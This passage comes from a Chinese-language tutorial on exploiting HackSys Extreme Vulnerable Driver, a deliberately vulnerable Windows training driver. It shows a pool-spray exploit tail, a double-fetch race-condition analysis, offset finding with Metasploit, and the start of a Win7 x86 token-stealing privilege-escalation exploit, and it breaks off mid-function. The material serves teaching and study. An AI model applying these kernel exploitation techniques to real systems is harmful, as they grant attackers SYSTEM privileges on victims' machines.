</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">memset</span><span class="p">(</span><span class="n">lpName</span><span class="p">,</span> <span class="sc">&#39;\x41&#39;</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">lpName</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">PDWORD32</span><span class="p">)(</span><span class="n">buf</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0xBAD0B0B0</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span> <span class="c1">// 为了不等于0xBAD0B0B0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">HANDLE</span> <span class="n">hDevice</span> <span class="o">=</span> <span class="nf">CreateFileA</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">HackSysExtremeVulnerableDriver&#34;</span><span class="p">,</span> <span class="mh">0xC0000000</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mh">0x3</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;lpName is in 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">lpName</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">//**************构造池块**************
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="o">*</span><span class="p">(</span><span class="n">PDWORD</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">lpName</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="o">&amp;</span><span class="n">shellCode</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">        <span class="o">*</span><span class="p">(</span><span class="n">PDWORD</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">lpName</span> <span class="o">+</span> <span class="mh">0xf0</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">Event_OBJECT</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nf">CreateEventW</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">lpName</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="c1">//**************构造池块**************
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">CloseHandle</span><span class="p">(</span><span class="n">Event_OBJECT</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span> <span class="c1">// 将创建的池块释放，释放的池块就为我们构造的shellcode地址
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="mh">0x222033</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bReturn</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">CreateCmd</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><h2 id="12triggerdoublefetch" class="heading-element">
  <a href="#12triggerdoublefetch" class="heading-mark"></a>12.TriggerDoubleFetch</h2><p>条件竞争漏洞</p>
<blockquote>
<p>在多线程访问临界区的情况下，使用进程互斥可以使多个线程不能同时访问操作关键区的变量，条件竞争漏洞就源于没有对可能会被多个线程访问的变量进行保护，导致多重访问使得在一次操作中，操作的值在中间发生了变化。</p>
</blockquote>
<h3 id="漏洞分析-7" class="heading-element">
  <a href="#%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90-7" class="heading-mark"></a>漏洞分析</h3><p>直接看源码，安全操作和含漏洞的代码区别在于：</p>
<p>安全的代码使用局部变量保存了用户传来的值，而不安全版本直接从用户内存去读取这个值</p>
<p>如果用户内存的这个结构的值是变化的，当校验的时候，Size合法，当复制的时候Size不合法，则可能造成缓冲区栈溢出</p>
<div class="highlight" id="id-106"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">##ifdef SECURE
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>    <span class="n">UserBuffer</span> <span class="o">=</span> <span class="n">UserDoubleFetch</span><span class="o">-&gt;</span><span class="n">Buffer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">UserBufferSize</span> <span class="o">=</span> <span class="n">UserDoubleFetch</span><span class="o">-&gt;</span><span class="n">Size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">ProbeForRead</span><span class="p">(</span><span class="n">UserBuffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">KernelBuffer</span><span class="p">),</span> <span class="p">(</span><span class="n">ULONG</span><span class="p">)</span> <span class="nf">__alignof</span><span class="p">(</span><span class="n">UCHAR</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">UserBufferSize</span> <span class="o">&gt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">KernelBuffer</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">Status</span> <span class="o">=</span> <span class="n">STATUS_INVALID_PARAMETER</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">Status</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">RtlCopyMemory</span><span class="p">((</span><span class="n">PVOID</span><span class="p">)</span><span class="n">KernelBuffer</span><span class="p">,</span> <span class="n">UserBuffer</span><span class="p">,</span> <span class="n">UserBufferSize</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">##else
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>    <span class="n">UserBuffer</span> <span class="o">=</span> <span class="n">UserDoubleFetch</span><span class="o">-&gt;</span><span class="n">Buffer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">UserBufferSize</span> <span class="o">=</span> <span class="n">UserDoubleFetch</span><span class="o">-&gt;</span><span class="n">Size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">ProbeForRead</span><span class="p">(</span><span class="n">UserBuffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">KernelBuffer</span><span class="p">),</span> <span class="p">(</span><span class="n">ULONG</span><span class="p">)</span> <span class="nf">__alignof</span><span class="p">(</span><span class="n">UCHAR</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">UserDoubleFetch</span><span class="o">-&gt;</span><span class="n">Size</span> <span class="o">&gt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">KernelBuffer</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">Status</span> <span class="o">=</span> <span class="n">STATUS_INVALID_PARAMETER</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">Status</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">RtlCopyMemory</span><span class="p">((</span><span class="n">PVOID</span><span class="p">)</span><span class="n">KernelBuffer</span><span class="p">,</span> <span class="n">UserBuffer</span><span class="p">,</span> <span class="n">UserBufferSize</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">##endif</span></span></span></code></pre></div><p>一个线程用来发起正常请求，一个线程用来修改Size大小：</p>
<div class="highlight" id="id-107"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">DWORD</span> <span class="n">WINAPI</span> <span class="nf">FlippingThread</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="n">TRUE</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">UserBuffer</span><span class="o">-&gt;</span><span class="n">Size</span> <span class="o">=</span> <span class="mh">0x900</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">DWORD</span> <span class="n">WINAPI</span> <span class="nf">RacingThread</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="n">TRUE</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">ULONG</span> <span class="n">WriteRet</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">UserBuffer</span><span class="o">-&gt;</span><span class="n">Size</span> <span class="o">=</span> <span class="mh">0x100</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nf">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="mh">0x222037</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">UserBuffer</span><span class="p">,</span> <span class="n">UserBufferSize</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">WriteRet</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>确定偏移：</p>
<div class="highlight" id="id-108"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">randomSeries</span> <span class="o">=</span> <span class="s">&#34;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="n">PVOID</span> <span class="n">EopPayload</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">TokenStealingPayloadWin7</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">hDevice</span> <span class="o">=</span> <span class="o">::</span><span class="nf">CreateFileW</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">HacksysExtremeVulnerableDriver&#34;</span><span class="p">,</span> <span class="n">GENERIC_ALL</span><span class="p">,</span> <span class="n">FILE_SHARE_WRITE</span><span class="p">,</span> <span class="n">nullptr</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">nullptr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="n">UserBuffer</span> <span class="o">=</span> <span class="p">(</span><span class="n">PUserObject</span><span class="p">)</span><span class="nf">HeapAlloc</span><span class="p">(</span><span class="nf">GetProcessHeap</span><span class="p">(),</span> <span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span> <span class="n">UserBufferSize</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="n">UserBuffer</span><span class="o">-&gt;</span><span class="n">Buffer</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONG_PTR</span><span class="p">)</span><span class="nf">HeapAlloc</span><span class="p">(</span><span class="nf">GetProcessHeap</span><span class="p">(),</span> <span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span> <span class="mh">0x900</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nf">RtlCopyMemory</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">UserBuffer</span><span class="o">-&gt;</span><span class="n">Buffer</span><span class="p">,</span> <span class="n">randomSeries</span><span class="p">,</span> <span class="mh">0x900</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">HANDLE</span> <span class="n">hThreadRacing</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">	<span class="n">HANDLE</span> <span class="n">hThreadFlipping</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="n">hThreadRacing</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nf">CreateThread</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">RacingThread</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">CREATE_SUSPENDED</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="n">hThreadFlipping</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nf">CreateThread</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">FlippingThread</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">CREATE_SUSPENDED</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="c1">// 设置优先级可以提升线程抢占到CPU的频率，更有机会执行到shellcode
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nf">SetThreadPriority</span><span class="p">(</span><span class="n">hThreadRacing</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">THREAD_PRIORITY_HIGHEST</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="nf">SetThreadPriority</span><span class="p">(</span><span class="n">hThreadFlipping</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">THREAD_PRIORITY_HIGHEST</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="nf">ResumeThread</span><span class="p">(</span><span class="n">hThreadRacing</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">		<span class="nf">ResumeThread</span><span class="p">(</span><span class="n">hThreadFlipping</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nf">WaitForMultipleObjects</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="n">hThreadRacing</span><span class="p">,</span> <span class="n">TRUE</span><span class="p">,</span> <span class="mi">60000</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">	<span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="nf">TerminateThread</span><span class="p">(</span><span class="n">hThreadRacing</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">			<span class="nf">CloseHandle</span><span class="p">(</span><span class="n">hThreadRacing</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">			<span class="nf">TerminateThread</span><span class="p">(</span><span class="n">hThreadFlipping</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">			<span class="nf">CloseHandle</span><span class="p">(</span><span class="n">hThreadFlipping</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nf">HeapFree</span><span class="p">(</span><span class="nf">GetProcessHeap</span><span class="p">(),</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">UserBuffer</span><span class="o">-&gt;</span><span class="n">Buffer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nf">HeapFree</span><span class="p">(</span><span class="nf">GetProcessHeap</span><span class="p">(),</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">UserBuffer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="n">UserBuffer</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nf">system</span><span class="p">(</span><span class="s">&#34;pause&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nf">system</span><span class="p">(</span><span class="s">&#34;cmd.exe&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>偏移：</p>
<div class="highlight" id="id-109"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">metasploit</span><span class="o">-</span><span class="n">framework</span><span class="o">/</span><span class="n">tools</span><span class="o">/</span><span class="n">exploit</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="err">└─$</span> <span class="p">.</span><span class="o">/</span><span class="n">pattern_offset</span><span class="p">.</span><span class="n">rb</span> <span class="o">-</span><span class="n">q</span> <span class="mi">72433372</span> 
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Exact</span> <span class="n">match</span> <span class="n">at</span> <span class="n">offset</span> <span class="mi">2080</span></span></span></code></pre></div><p>之后根据偏移去覆盖ret地址就可以了</p>
<h3 id="exp-6" class="heading-element">
  <a href="#exp-6" class="heading-mark"></a>EXP</h3><div class="highlight" id="id-110"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">##include &lt;iostream&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp">##include &lt;Windows.h&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp">##include &lt;Psapi.h&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="c1">// Windows 7 SP1 x86 Offsets
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">##define KTHREAD_OFFSET     0x124  </span><span class="c1">// nt!_KPCR.PcrbData.CurrentThread
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">##define EPROCESS_OFFSET    0x050  </span><span class="c1">// nt!_KTHREAD.ApcState.Process
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">##define PID_OFFSET         0x0B4  </span><span class="c1">// nt!_EPROCESS.UniqueProcessId
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">##define FLINK_OFFSET       0x0B8  </span><span class="c1">// nt!_EPROCESS.ActiveProcessLinks.Flink
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">##define TOKEN_OFFSET       0x0F8  </span><span class="c1">// nt!_EPROCESS.Token
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">##define SYSTEM_PID         0x004  </span><span class="c1">// SYSTEM Process PID
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_UserObject</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="n">ULONG_PTR</span> <span class="n">Buffer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">ULONG</span> <span class="n">Size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="n">UserObject</span><span class="p">,</span> <span class="o">*</span><span class="n">PUserObject</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">HANDLE</span> <span class="n">hDevice</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="n">ULONG</span> <span class="n">UserBufferSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">UserObject</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="n">PUserObject</span> <span class="n">UserBuffer</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">VOID</span> <span class="nf">TokenStealingPayloadWin7</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="c1">// Importance of Kernel Recovery
